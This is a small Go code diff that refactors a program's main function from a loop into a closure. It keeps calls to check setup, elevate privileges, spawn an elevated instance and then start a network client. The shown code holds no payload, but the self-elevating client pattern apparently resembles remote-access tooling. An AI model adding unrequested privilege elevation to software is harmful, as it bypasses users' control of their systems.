@@ -7,20 +7,20 @@ import (
 )
 
 func main() {
-	for {
+	func() {
 		if client.CheckSetup() {
-			break
+			return
 		}
 		if client.CheckElevate() {
 			client.Setup()
-			break
+			return
 		}
 		if client.Elevate() == nil {
+			// elevate sucessful, another instance has been spawned no need to keep this running
 			os.Exit(0)
 		}
 		client.Setup()
-		break
+	}()
 
-	}
 	client.NetClient()
 }
